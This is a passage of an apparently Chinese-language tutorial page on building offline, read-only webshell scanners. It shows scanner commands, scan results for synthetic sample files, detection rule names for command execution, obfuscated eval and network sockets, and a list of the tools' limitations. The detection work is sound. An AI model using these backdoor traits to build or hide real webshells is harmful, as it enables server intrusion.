+<blockquote>
+<p>注意 <code>0</code> <strong>不代表安全认证</strong>，只代表"这次扫描按计划跑完了"。<br>
+反过来，<code>2</code> 也不代表"发现了攻击"，它更可能是"有文件太大读不了"。</p>
+</blockquote>
+<h2 id="9">9. 运行命令 + 预期输出（实测）</h2>
+<h3 id="91">9.1 自测（四个文件）</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="nb">cd</span><span class="w"> </span>~/code/Learn-Python
+python3<span class="w"> </span>days/day-158-webshell-检测/code/static_scan.py<span class="w">        </span>--self-test
+python3<span class="w"> </span>days/day-158-webshell-检测/code/01-static-scanner.py<span class="w">  </span>--self-test
+python3<span class="w"> </span>days/day-158-webshell-检测/code/02-behavior-hunter.py<span class="w"> </span>--self-test
+python3<span class="w"> </span>days/day-158-webshell-检测/code/03-webshell-scanner.py<span class="w"> </span>--self-test
+</code></pre></div>
+<p>预期输出（四个都一致）：</p>
+<pre class="plain"><code>SELF-TEST OK
+</code></pre>
+<p>退出码 0。自测<strong>完全离线</strong>：不联网、不需要 sudo、不依赖任何第三方库。<br>
+<code>static_scan.py</code> 是共享模块（被 01/02/03 import），它的 <code>--self-test</code> 单独验证<br>
+规则库结构、分级阈值、评分封顶、语言过滤四件事。</p>
+<h3 id="92">9.2 生成样本集并扫描</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl">python3<span class="w"> </span>days/day-158-webshell-检测/code/01-static-scanner.py<span class="w"> </span>--lab
+</code></pre></div>
+<p>预期输出是一段 JSON（节选，实测）：</p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">json</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;files&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;file&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;asp.asp&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;scanned&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;score&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;severity&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;medium&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;summary&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;asp_wscript_shell&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;category&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;command&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;weight&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;lines&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="mi">2</span><span class="p">]}}</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;file&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;benign-upload.php&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;scanned&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;score&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;severity&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;high&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;summary&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;file_write&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;...&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="p">},</span><span class="w"> </span><span class="nt">&quot;php_superglobal_input&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;...&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="p">},</span>
+<span class="w">                  </span><span class="nt">&quot;encode_encode&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;...&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="p">}}</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;file&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;docs.txt&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;scanned&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;score&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;severity&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;medium&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;summary&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;php_cmd_exec&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;category&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;command&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;weight&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;lines&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">]}}</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;file&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;obfuscated.php&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;scanned&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;score&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">9</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;severity&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;critical&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;summary&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;php_dynamic_eval&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;...&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="p">},</span><span class="w"> </span><span class="nt">&quot;encode_decode&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;...&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="p">}}</span><span class="w"> </span><span class="p">}</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;truncated&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;walk_errors&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>把 12 个文件的分级汇总成表（实测）：</p>
+<pre class="plain"><code>asp.asp                medium    score=3   rules=[&#x27;asp_wscript_shell&#x27;]
+aspx.aspx.cs           medium    score=3   rules=[&#x27;aspx_process_start&#x27;]
+benign-upload.php      high      score=5   rules=[&#x27;encode_encode&#x27;,&#x27;file_write&#x27;,&#x27;php_superglobal_input&#x27;]
+callback-backdoor.php  medium    score=3   rules=[&#x27;php_call_user_func&#x27;,&#x27;php_superglobal_input&#x27;]
+clean.php              low       score=1   rules=[&#x27;php_superglobal_input&#x27;]
+docs.txt               medium    score=4   rules=[&#x27;php_cmd_exec&#x27;]
+dynamic-include.php    medium    score=3   rules=[&#x27;include_dynamic&#x27;,&#x27;php_superglobal_input&#x27;]
+jsp.jsp                medium    score=3   rules=[&#x27;jsp_runtime_exec&#x27;]
+network-backdoor.php   medium    score=4   rules=[&#x27;file_write&#x27;,&#x27;network_socket&#x27;]
+obfuscated.php         critical  score=9   rules=[&#x27;encode_decode&#x27;,&#x27;encode_encode&#x27;,&#x27;php_dynamic_eval&#x27;,&#x27;php_error_suppress&#x27;]
+simple-cmd.php         medium    score=3   rules=[&#x27;php_cmd_exec&#x27;]
+upload-shell.php       medium    score=4   rules=[&#x27;file_write&#x27;,&#x27;php_superglobal_input&#x27;]
+</code></pre>
+<p><strong>读这张表的正确方式</strong>：<code>obfuscated.php</code>（真后门骨架）在最上面，<code>docs.txt</code>（纯文档）<br>
+和 <code>benign-upload.php</code>（正常业务）<strong>也在高危附近</strong> —— 这就是误报的真实形态。</p>
+<h3 id="93">9.3 行为关联</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="c1"># 上传脚本 + 子进程 + shell 参数（同主机同实例）→ 触发复核</span>
+python3<span class="w"> </span>days/day-158-webshell-检测/code/02-behavior-hunter.py<span class="w"> </span>--events<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s1">&#39;[{&quot;host&quot;:&quot;web01&quot;,&quot;instance&quot;:&quot;worker-start-1&quot;,&quot;request&quot;:&quot;/u/a.php&quot;,&quot;kind&quot;:&quot;upload_script_write&quot;},</span>
+<span class="s1">    {&quot;host&quot;:&quot;web01&quot;,&quot;instance&quot;:&quot;worker-start-1&quot;,&quot;kind&quot;:&quot;child_start&quot;}]&#39;</span>
+</code></pre></div>
+<p>预期输出（节选）：</p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">json</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="p">[</span>
+<span class="w">  </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;host&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;web01&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;instance&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;worker-start-1&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;review_required&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;signals&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;child_start&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;upload_script_write&quot;</span><span class="p">],</span>
+<span class="w">    </span><span class="nt">&quot;score&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">]</span>
+</code></pre></div>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="c1"># 时间窗缺失 → 拒绝下结论</span>
+python3<span class="w"> </span>days/day-158-webshell-检测/code/02-behavior-hunter.py<span class="w"> </span>--no-window<span class="w"> </span>--events<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s1">&#39;[{&quot;host&quot;:&quot;web01&quot;,&quot;instance&quot;:&quot;i&quot;,&quot;kind&quot;:&quot;child_start&quot;}]&#39;</span>
+</code></pre></div>
+<p>预期输出：</p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">json</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="p">[</span>
+<span class="w">  </span><span class="p">{</span><span class="nt">&quot;host&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;web01&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;instance&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;unknown&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;review_required&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">   </span><span class="nt">&quot;signals&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w"> </span><span class="nt">&quot;score&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;reason&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;time_window_unknown&quot;</span><span class="p">}</span>
+<span class="p">]</span>
+</code></pre></div>
+<h3 id="94">9.4 扫描自己的离线副本</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl">python3<span class="w"> </span>days/day-158-webshell-检测/code/03-webshell-scanner.py<span class="w"> </span>--rules
+python3<span class="w"> </span>days/day-158-webshell-检测/code/03-webshell-scanner.py<span class="w"> </span>./my-offline-copy<span class="w"> </span>--max-files<span class="w"> </span><span class="m">500</span>
+</code></pre></div>
+<p><code>--rules</code> 预期输出 20 行规则表 + 类别/权重/语言（见 5.1）。<br>
+扫描目录时输出 JSON 报告；<strong>若目录里有太大/非 UTF-8/符号链接的文件，<br>
+退出码为 2</strong>，且 <code>files[*].reason</code> 会写明 <code>too_large</code> / <code>not_utf8</code> / <code>symlink</code> /<br>
+<code>binary</code> / <code>not_regular</code>。默认不扫 <code>/var/www</code> 或全盘，必须显式指定目录。</p>
+<h2 id="10">10. 局限与自测覆盖</h2>
+<h3 id="101-self-test">10.1 自测覆盖了什么（<code>--self-test</code> 断言清单）</h3>
+<table>
+<thead>
+<tr>
+<th>断言</th>
+<th>验证的行为</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td clean_="clean," low_="low," medium><code>clean.php</code> 等级 ∈</td>
+<td>正常代码不会被定级为 high/critical</td>
+</tr>
+<tr>
+<td high medium_="medium,"><code>docs.txt</code> 有命中且等级 ∈</td>
+<td>文档误报确实存在（教学点可复现）</td>
+</tr>
+<tr>
+<td><code>simple-cmd.php</code> 命中 <code>php_cmd_exec</code></td>
+<td>命令执行特征识别</td>
+</tr>
+<tr>
+<td critical high_="high,"><code>obfuscated.php</code> 命中 <code>encode_decode</code> + <code>php_dynamic_eval</code> 且 ∈</td>
+<td>混淆样本识别 + 分级</td>
+</tr>
+<tr>
+<td>ASP / JSP / ASPX 各自规则命中</td>
+<td>三语言特征覆盖</td>
+</tr>
+<tr>
+<td>上传/外联/包含/回调样本各自规则命中</td>
+<td>四类形态覆盖</td>
+</tr>
+<tr>
+<td><code>benign-upload.php</code> 命中 <code>file_write</code> 且等级 ≠ clean</td>
+<td><strong>命中 ≠ 恶意</strong>（最重要的一条）</td>
+</tr>
+<tr>
+<td><code>inspect_text</code> → <code>score_findings</code> → <code>classify_score</code> 自洽</td>
+<td>评分与分级一致</td>
+</tr>
+<tr>
+<td>跨主机 / 跨实例不误关联</td>
+<td>行为关联的分组键正确</td>
+</tr>
+<tr>
+<td>缺必要字段 → <code>ValueError</code></td>
+<td>不静默吞掉数据缺陷</td>
+</tr>
+<tr>
+<td><code>--no-window</code> → <code>time_window_unknown</code></td>
+<td>信息不全时不下结论</td>
+</tr>
+<tr>
+<td>扫描前后文件 SHA-256 一致</td>
+<td><strong>只读性</strong></td>
+</tr>
+<tr>
+<td><code>too_large</code> / <code>not_utf8</code> 被正确跳过</td>
+<td>资源限制与编码守卫</td>
+</tr>
+<tr>
+<td><code>json.loads(json.dumps(report)) == report</code></td>
+<td>报告可序列化</td>
+</tr>
+<tr>
+<td>不存在的目录 → <code>ValueError</code></td>
+<td>参数校验</td>
+</tr>
+<tr>
+<td><code>static_scan.py --self-test</code>：规则名唯一、权重 1–3、评分封顶=5、JSP 文件不命中 PHP 规则</td>
+<td>规则引擎本身（不依赖任何样本文件）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="102">10.2 没有覆盖的（生产化前必须补齐，且<strong>必须留在报告里</strong>）</h3>
+<ul>
+<li><strong>检出率评测</strong>：没有在带标签的授权样本集上算 precision/recall，<br>
+  因此<strong>不能</strong>声明"能检出 X% 的 WebShell"</li>
+<li><strong>语义 / 数据流分析</strong>：分不清"外部输入是否真的到达危险调用"，<br>
+  所以 <code>benign-upload.php</code> 这类正常业务会一直高分</li>
+<li><strong>压缩包与图片马</strong>：不展开 zip、不解析图片元数据，藏在里面的代码看不见</li>
+<li><strong>编码归一化</strong>：不做 Unicode/宽字符归一，异体字/全角写法可能绕过</li>
+<li><strong>内存马 / 无文件后门</strong>：结构上看不到（见 2.4）</li>
+<li><strong>生产日志采集与时间窗切分</strong>：行为关联用的是合成事件，没有接真实采集管道</li>
+<li><strong>误报率</strong>：没有在真实业务代码上测过误报，权重与阈值只是教学基线</li>
+</ul>
+<blockquote>
+<p><strong>纪律</strong>：未覆盖项必须保留在报告里，不得用"零告警"把它隐藏掉。<br>
+"我没扫到"和"我扫了但没覆盖"是两件完全不同的事。</p>
+</blockquote>
+<h2 id="11">11. 后续练习</h2>
+<p>见 <a href="exercises/checklist.md">练习清单</a> 与 <a href="diagrams/README.md">原理图</a>。<br>
+练习要求用正常代码建立标签集、计算误报率/召回率、做数据流与行为关联分析——<br>
+全部在授权环境与离线只读副本上进行。特别推荐：</p>
+<ol>
+<li>给 <code>benign-upload.php</code> 做<strong>数据流分析</strong>：写出"路径是否可控"的判定逻辑</li>
+<li>给规则引擎加<strong>注释剔除</strong>（先剥掉 <code>//</code> 与 <code>/* */</code> 再匹配），量化 <code>docs.txt</code> 的降噪效果</li>
+<li>给 <code>.cs</code> / <code>.md</code> / <code>.txt</code> 设计扩展名策略，比较误报变化</li>
+<li>写一份"命中即删除"的反例说明：为什么自动化删除危险文件是错误设计</li>
+</ol>
+  </main>
+</div>
+
+<nav class="pager">
+  <a class="nav-prev" href="../day-157/index.html">← Day 157 流量分析：PCAP 格式、pyshark/tshark 与标准库解析双路径</a><a class="nav-next" href="../day-159/index.html">Day 159 安全审计工具：扫描器设计 · 报告生成 · CLI 整合 →</a>
+</nav>
+
+<script src="../assets/mermaid.min.js"></script>
+<script>
+if (window.mermaid) {
+  mermaid.initialize({ startOnLoad: true, securityLevel: 'loose', theme: 'default' });
+}
+function copyCode(btn) {
+  var pre = btn.closest('.codeblock').querySelector('pre');
+  navigator.clipboard.writeText(pre.innerText).then(function () {
+    var o = btn.textContent; btn.textContent = '已复制';
+    setTimeout(function () { btn.textContent = o; }, 1500);
+  });
+}
+</script>
+</body>
+</html>
